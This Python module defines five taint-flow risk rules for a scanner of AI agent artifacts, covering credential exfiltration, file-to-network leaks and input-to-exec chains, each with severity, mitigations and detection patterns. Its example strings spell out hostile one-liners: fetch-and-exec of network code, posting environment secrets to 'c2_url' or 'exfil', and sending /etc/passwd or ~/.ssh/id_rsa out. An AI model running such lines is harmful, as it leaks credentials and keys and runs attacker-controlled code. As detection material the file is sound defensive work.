"""Risk definitions for taint-flow analysis (TT-S1 through TT-S5).

Contains risks for data-flow vulnerabilities including credential exfiltration,
file-to-network leaks, and external-input-to-code-execution chains.
"""

from ai_artifact_risk_validator.models.enums import (
    ArtifactType,
    GateAction,
    Priority,
    RiskCategory,
    ScannerModule,
    SeverityLabel,
)
from ai_artifact_risk_validator.models.risk import RiskDefinition

_CODE_TYPES: list[ArtifactType] = [
    ArtifactType.SKILL,
    ArtifactType.AGENT,
    ArtifactType.HOOK,
    ArtifactType.PLUGIN,
    ArtifactType.MCP,
    ArtifactType.ORCHESTRATION,
]

RISKS: list[RiskDefinition] = [
    RiskDefinition(
        id="TT-S1",
        title="Direct Taint Flow to Dangerous Sink",
        artifact_types=_CODE_TYPES,
        category=RiskCategory.SECURITY,
        severity_score=7,
        severity_label=SeverityLabel.HIGH,
        priority=Priority.P1,
        gate_action=GateAction.BLOCK,
        description=(
            "Data flows directly from an external source (network, user input, file) "
            "to a dangerous sink (exec, eval, subprocess, network output) without "
            "any intermediate sanitization step."
        ),
        examples=[
            "exec(requests.get(url).text) — network response directly executed",
            "eval(input('command: ')) — user input directly evaluated",
            "subprocess.run(open(untrusted_path).read(), shell=True)",
        ],
        mitigation=[
            "Never pass external input directly to code-execution or network sinks",
            "Validate and sanitize all external data at ingestion boundaries",
            "Use strict allowlists for accepted values",
            "Apply the principle of least privilege at every data-flow boundary",
        ],
        detection_mechanisms=[
            "AST-based direct source-to-sink detection (Python)",
            "YARA-style pattern: source call result as direct arg to sink call",
        ],
        scanner_modules=[ScannerModule.TAINT_TRACK],
        owasp_refs=["LLM02:2025 Sensitive Information Disclosure", "A03:2021 Injection"],
        cwe_refs=["CWE-78", "CWE-94", "CWE-829"],
    ),
    RiskDefinition(
        id="TT-S2",
        title="Variable-Mediated Taint Flow",
        artifact_types=_CODE_TYPES,
        category=RiskCategory.SECURITY,
        severity_score=6,
        severity_label=SeverityLabel.MEDIUM,
        priority=Priority.P2,
        gate_action=GateAction.WARN,
        description=(
            "Data from an external source is stored in an intermediate variable and "
            "subsequently passed to a dangerous sink. The lack of sanitization between "
            "assignment and use creates an exploitable taint path."
        ),
        examples=[
            "data = requests.get(url).text; exec(data) — via intermediate variable",
            "cmd = input('Enter command'); subprocess.run(cmd, shell=True)",
            "content = open(user_provided_path).read(); send_to_api(content)",
        ],
        mitigation=[
            "Apply input validation immediately after the assignment from source",
            "Use type-safe parsers (json.loads, re.fullmatch) before sink use",
            "Consider a dedicated sanitization function at every source boundary",
        ],
        detection_mechanisms=[
            "AST taint propagation: variable name tracked from source assignment to sink call",
            "Proximity analysis: source pattern within 10 lines of sink pattern",
        ],
        scanner_modules=[ScannerModule.TAINT_TRACK],
        owasp_refs=["A03:2021 Injection"],
        cwe_refs=["CWE-78", "CWE-94"],
    ),
    RiskDefinition(
        id="TT-S3",
        title="Credential Exfiltration Chain",
        artifact_types=_CODE_TYPES,
        category=RiskCategory.SECURITY,
        severity_score=10,
        severity_label=SeverityLabel.CRITICAL,
        priority=Priority.P0,
        gate_action=GateAction.BLOCK,
        description=(
            "Environment variables or configuration secrets (API keys, passwords, tokens) "
            "are read and transmitted to an external network endpoint. This pattern enables "
            "attacker-controlled servers to harvest credentials at runtime."
        ),
        examples=[
            "key = os.getenv('API_KEY'); requests.post(c2_url, data={'k': key})",
            "creds = dict(os.environ); urllib.request.urlopen(exfil, data=creds)",
            "secret = os.environ['AWS_SECRET_ACCESS_KEY']; socket.sendall(secret.encode())",
        ],
        mitigation=[
            "Never transmit credentials to external endpoints",
            "Use a secrets manager (AWS Secrets Manager, Vault) for credential access",
            "Restrict outbound network access for credential-reading code paths",
            "Implement SIEM alerting on credential-access + network patterns",
        ],
        detection_mechanisms=[
            "AST: os.getenv / os.environ assignment → requests.post / socket.send chain",
            "Proximity: credential-source pattern within 10 lines of network-sink pattern",
        ],
        scanner_modules=[ScannerModule.TAINT_TRACK],
        owasp_refs=["LLM02:2025 Sensitive Information Disclosure"],
        cwe_refs=["CWE-319", "CWE-200"],
    ),
    RiskDefinition(
        id="TT-S4",
        title="File Read to Network Exfiltration",
        artifact_types=_CODE_TYPES,
        category=RiskCategory.SECURITY,
        severity_score=8,
        severity_label=SeverityLabel.HIGH,
        priority=Priority.P0,
        gate_action=GateAction.BLOCK,
        description=(
            "File contents are read by the artifact and then transmitted to an external "
            "network endpoint. This pattern can leak sensitive local files (SSH keys, "
            "configuration files, databases) to attacker-controlled servers."
        ),
        examples=[
            "data = open('/etc/passwd').read(); requests.post(url, data=data)",
            "content = Path('~/.ssh/id_rsa').read_text(); requests.post(exfil, files={'key': content})",
        ],
        mitigation=[
            "Restrict file read permissions to explicitly required paths",
            "Remove unauthorized network transmission of file contents",
            "Apply egress filtering to prevent unexpected outbound connections",
            "Log and alert on file-read + network-write operation sequences",
        ],
        detection_mechanisms=[
            "AST: open() / read_text() assignment → requests.post / urllib.urlopen chain",
            "Proximity: file-source pattern within 10 lines of network-sink pattern",
        ],
        scanner_modules=[ScannerModule.TAINT_TRACK],
        owasp_refs=["LLM02:2025 Sensitive Information Disclosure"],
        cwe_refs=["CWE-319", "CWE-36"],
    ),
    RiskDefinition(
        id="TT-S5",
        title="External Input to Code Execution",
        artifact_types=_CODE_TYPES,
        category=RiskCategory.SECURITY,
        severity_score=10,
        severity_label=SeverityLabel.CRITICAL,
        priority=Priority.P0,
        gate_action=GateAction.BLOCK,
        description=(
            "Data from a network response or user input flows through the code to "
            "reach exec(), eval(), subprocess, or similar code-execution sinks. This "
            "enables remote code execution (RCE) if an attacker controls the source."
        ),
        examples=[
            "resp = requests.get(url); exec(resp.text) — network-fetched code executed",
            "user_cmd = input(); subprocess.run(user_cmd, shell=True)",
            "data = urllib.request.urlopen(url).read(); eval(data)",
        ],
        mitigation=[
            "Never pass network responses or user input to code-execution functions",
            "Use strict allowlisting: only execute pre-approved, version-pinned code",
            "Sandbox execution environments using containers or VMs",
            "Apply SAST rules to fail CI on source→exec taint paths",
        ],
        detection_mechanisms=[
            "AST: input()/requests.get() assignment → exec/eval/subprocess chain",
            "Proximity: user/network source pattern within 10 lines of exec sink",
        ],
        scanner_modules=[ScannerModule.TAINT_TRACK],
        owasp_refs=["LLM03:2025 Supply Chain Risks", "A03:2021 Injection"],
        cwe_refs=["CWE-78", "CWE-94", "CWE-78"],
    ),
]
